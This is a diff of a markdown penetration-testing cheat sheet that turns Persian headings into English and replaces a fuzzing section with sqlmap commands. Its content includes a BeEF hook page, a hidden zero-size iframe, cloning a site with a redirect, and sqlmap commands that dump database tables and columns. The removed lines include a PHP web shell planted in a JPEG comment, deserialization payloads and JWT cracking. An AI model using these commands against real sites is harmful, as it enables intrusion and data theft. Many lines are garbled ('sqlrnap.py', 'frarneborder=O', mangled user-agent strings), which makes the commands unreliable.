@@ -1,15 +1,14 @@
 ---
 layout: default
-published: true
 ---
 
-# وب
+# Web
 
-## user-agent های متداول
+## Common user-agent strings
 
 ### Internet explorer \(6.0, 7.0, 8.0, 9.0\)
 
-| **Agent** | **نسخه** |
+| **Agent** | **Version** |
 | :--- | :--- |
 | Mozilla/4.0 \(compatible; MSIE 6.0; Windows NT 5.1; SV1\) | IE 6.0/WinXP 32-bit |
 | Mozilla/ 4. 0 \(compatible; MSIE 7. 0; Windows NT 5.1; SV1; .NET CLR 2.0.50-2 7 \) | IE 7.0/WinXP 32-bit |
@@ -19,7 +18,7 @@ published: true
 
 ### Firefox \(5.0, 13.0, 17.0\)
 
-| **Agent** | **نسخه** |
+| **Agent** | **Version** |
 | :--- | :--- |
 | Mozilla/5.0 \(Windows NT 6.1; WOW64; rv:5.0\) Gecko/20100101 Firefox/5.0 | Firefox 5.0/Win7 64-bit |
 | Mozilla/5.0 \(Windows NT 5.1; rv:13.0\) Gecko/20100101 Firefox/13.0.1 | Firefox 13.0/WinXP 32-bit |
@@ -30,7 +29,7 @@ published: true
 
 ### Chrome \(Generic 13.0\)
 
-| **Agent** | **نسخه** |
+| **Agent** | **Version** |
 | :--- | :--- |
 | Mozilla/5.0 \(Windows NT 5.1\) AppleWebKit/537.11 \(KHTML, like Gecko\) Chrome/23.0.1271.97 Safari/53-.11 | Chrome Generic/WinXP |
 | Mozilla/5.0 \(Windows NT 6.1\) AppleWebKit/537 .11 \(KHTl~L, like Gecko\) Chrome/23.0.1271.97 Safari/53-.11 | Chrome Generic/Win7 |
@@ -46,15 +45,15 @@ published: true
 
 ### Mobile safari \(4.0 & 6.0\)
 
-| **Agent** | **نسخه** |
+| **Agent** | **Version** |
 | :--- | :--- |
 | Mozilla/5.0 \(iPad; CPU OS 6 0 1 like Mac OS X\) AppleWebKit/536.26 \(KHTML, like Gecko\) Version/6.0 Mobile/10A523 Safari/8536.25 | Mobile Safari 6.0/iOS \(iPad\) |
 | Mozilla/5.0 \(iPhone; CPU iPhone OS 6 0 1 like l~ac OS X\) AppleWebKit/536.26 \(KHTML, like Gecko\) Version/6.0 Mobile/10A523 Safari/8536.25 | Mobile Safari 6.0/iOS \(iPhone\) |
 | Mozilla/5.0 \(Linux; U; Android 2.2; fr-fr; Desire A8181 Build/FRF91\) App3leWebKit/53.1 \(KHTML, like Gecko\) Version/4. 0 Mobile Safari/533.1 | Mobile Safari 4.0/Android |
 
-## زبان HTML
+## HTML
 
-### کد beef جا ساز شده در iframe
+### Html beef hook with embedded frame
 
 ```text
 !DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
@@ -78,7 +77,7 @@ frame src="/e" frarneborder=O scrolling=no noresize=noresize /
 /html
 ```
 
-### کد java applet جاساز شده \(\* باید در &lt;body&gt; قرار بگیرد\)
+### Embedded java applet \(\* place within &lt;body&gt; tag\)
 
 ```text
 applet archive="legit.jar" code="This is a legit applet" width="1"
@@ -86,7 +85,7 @@ height="1"
 /applet
 ```
 
-### iframe توکار
+### Embedded iframe
 
 ```text
 iframe src="http://1.1.1.1" width="0" height="0" frameborder="0"
@@ -94,7 +93,7 @@ tabindex="-1" title="empty" style="visibility:hidden;display:none"
 /iframe
 ```
 
-### روش های ارتباط Firefox 
+### Firefox type conversation
 
 ```text
 ASCII  -   Base64   javascript:btoa("ascii str")
@@ -103,43 +102,43 @@ ASCII  -   URI      javascript:encodeURI(" script "}
 URI    -   ASCII    javascript:decodeURI("%3cscript%3E")
 ```
 
-## دستور Wget
+## Wget
 
-### ضبط جلسه توکن
+### Capture session token
 
 ```text
 wget -q --save-cookies=cookie.txt --keep-session-cookies --post-
 data="username: admin&password=pass&Login=Login" http://url/login. php
 ```
 
-## دستور Curl
+## Curl
 
-### دریافت headers صفحه وب با تغییر user agent
+### Grab headers and spoof user agent
 
 ```text
 curl -I -X HEAD -A "Mozilla/5.0 (compatible; MSIE 7.01; Windows NT 5.0)"
 http:// ip
 ```
 
-### دریافت صفحه پس از احراز هویت
+### Scrape site after login
 
 ```text
 curl -u user:pass -o outfile https://login.bob.com
 ```
 
-### دستور Ftp
+### Ftp
 
 ```text
 curl ftp://user:pass@bob.com/directory/
 ```
 
-### بررسی فایل های مختلف
+### Sequential lookup
 
 ```text
 curl http://bob.com/file[l-10] .txt
 ```
 
-### ایجاد Basic authentication در apache2
+### Basic authentication using apache2
 
 ```text
 The steps below will clone a website and redirect after 3 seconds to
@@ -176,9 +175,9 @@ content="3;url=http:// domainlip /1/index.html"/
     http:// domainlip /index.html
 ```
 
-## خودکار سازی فرآیند عکس از صفحه وب
+## Automated web page screenshots
 
-### با استفاده از nmap
+### Nmap web page screenshots\[9\]
 
 ```text
 Install dependencies:
@@ -206,7 +205,7 @@ width=400 BR BR ")' preview. html
 printf " /BODY /HTML. " preview. html
 ```
 
-### دستور Peepingtom 
+### Peepingtom web page screenshots
 
 ```text
 Install Dependencies:
@@ -220,131 +219,54 @@ Run PeepingTom
     python peepingtom.py http:// mytarget.com
 ```
 
+## Sqlmap
 
-## تزریق پیلود های مختلف با wfuzz
+### Get request
 
 ```text
-wfuzz -c -z file,/usr/share/wfuzz/wordlist/Injections/XSS.txt -hc 404 https://www.example.com/?req=search_site&searchTitle=FUZZ
+./sqlmap.py -u "http:// url ?id=1&str=val"
 ```
 
-## حدس فایل های مختلف با پسوند های مشخص با wfuzz
+### Post request
 
 ```text
-wfuzz -w /usr/share/wordlists/big.txt -u http://admirer.htb/admin/FUZZ.FUZ2Z -z list,txt-php --hc 403,404 -c 
+./sqlmap.py -u "http:// url " --data="id=1&str=val"
 ```
 
-## حدس در خواست های POST
+### Sql injection against specific parameter with db type specified
 
 ```text
-wfuzz -X POST -u ''http://quick.htb/login.php' -w elist.txt -d 'email=FUZZ&password=123456' -hc 200 -c
+./sqlmap.py -u "http:// url" --data="id=l&str=val" -p "id"
+-b --dbms=" mssqllmysqlloraclelpostgres "
 ```
 
-## حدس مسیر های وب با ffuf 
+### Sql injection on authentication site
 
 ```text
-ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -u http://10.10.10.10/FUZZ
+1.Login and note cookie value (cookie1=val1, cookie2=val2)
+./sqlrnap.py -u "http:// url " --data="id=l&str=val" -p "id"
+--cookie="cookiel=vall;cookie2=val2"
 ```
 
-## حدس subdomain با gobuster 
+### Sql injection and collect db version, name, and user
 
 ```text
-gobuster dns -t 50 -d pubg.com -w ~/seclists/Dir/subdomains.dat
+./sqlmap.py -u "http:// url " --data="id=1&str=val" -p "id" -b --current-db
+--current-user
 ```
 
-حدس subdomain با ffuf
+### Sql injection and get tables of db=testdb
 
 ```text
-ffuf -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://
-example.com/ -H "Host: FUZZ.example.com" 
+./sqlmap.py -u "http:// url " --data="id=1&str=val" -p "id" --tables -D
+"testdb"
 ```
 
-## پیدا نمودن subdomain بر اساس گواهی نامه ها
+### Sql injection and get columns of user table
 
 ```text
-https://crt.sh/
-```
-
-و 
-
-```text
-assetfinder --subs-only <domain> | httprobe
-```
-
-## تزریق php درون jpeg
-
-```text
-exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' me.jpg
-```
-
-## اکسپلویت deserialization برنامه های جاوا
-
-```text
-java -jar ysoserial.jar CommonsBeanutils1 'COMMAND' | base64 -w0
-```
-
-## وب شل های معروف
-
-```text
-https://github.com/TheBinitGhimire/Web-Shells
-```
-
-## استخراج ساختار پوشه ها و فایل ها از .git
-
-https://github.com/arthaud/git-dumper
-
-```text
-./git-dumper.py http://example.com/.git/ example.com
-```
-
-## استخراج اطلاعات از .git
-
-https://github.com/internetwache/GitTools
-
-```text
-./extractor.sh /tmp/mygitrepo /tmp/mygitrepodump
-```
-
-## استخراج اطلاعات از .DS_Store
-
-```text
-1-find structure
-python2.7 ds_store_exp.py http://poo.htb/.DS_Store
-2-enum in finded path 
-java -jar iis_shortname_scanner.jar 2 20 http://poo.htb/dev/dca66d38fd916317687e1390a420c3fc/db/
-```
-
-## استخراج پارامتر های صفحات
-
-```text
-python3 paramspider.py --domain bugcrowd.com --exclude woff,css,js,png,svg,php,jpg --output bugcrowd.txt
-```
-
-## بررسی ساختار پارامتر ها بر اساس الگو های آسیب پذیری ها
-
-```text
-gf xss domain.txt
-gf potential domain.txt
-```
-
-## حدس کلید رمزنگاری متقارن jwt
-
-```text
-jwt-cracker "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ" "abcdefghijklmnopqrstuwxyz" 6
-
-یا 
-
-./jwtcrack eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoicm9vdCIsInBlcm1pc3Npb25zIjpbInVzZXI6cmVhZCIsInVzZXI6d3JpdGUiXSwiaWF0IjoxNTkxMTcxODU4LCJleHAiOjE1OTEzNDQ2NTgsImlzcyI6Imh0dHBzOi8vZ2l0aHViLmNvbS9zbm9vcHlzZWN1cml0eSJ9.blfmt8RiLnBO8mfOKS1Y8u_aFZnMpgNhpQzooLADHcs
+./sqlrnap.py -u "http:// url " --data="id=l&str=val" -p "id" --columns -T
+"users"
 ```
 
 
-## حدس کلید عمومی رمزنگاری نامتقارن jwt
-
-```text
-docker run --rm -it portswigger/sig2n <token1> <token2> 
-```
-
-## ایجاد وب شل jpg
-
-```text
-exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' meme.jpg
-```
